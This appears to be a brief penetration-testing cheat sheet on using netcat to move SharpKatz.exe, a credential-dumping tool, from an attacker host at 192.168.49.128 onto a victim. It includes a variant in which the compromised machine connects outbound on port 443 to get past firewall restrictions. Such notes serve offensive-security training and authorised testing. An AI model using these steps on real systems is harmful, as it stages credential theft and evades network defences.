### Send a File to a Listening Target
```bash
# On the Victim (Receiving the File) 
nc -l -p 8000 > SharpKatz.exe

# On the Attacker (Sending the File) 
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

### Send a File from a Compromised Host to an Attacker *(Firewall Evasion)*
```bash
# On the Attacker (Listening for Connection)
sudo nc -l -p 443 -q 0 < SharpKatz.exe  

# On the Compromised Machine (Receiving the File)
nc 192.168.49.128 443 > SharpKatz.exe  
```
**Why?** If the compromised machine is **behind a firewall**, it may be able to **outbound connect to the attack box**, bypassing restrictions.
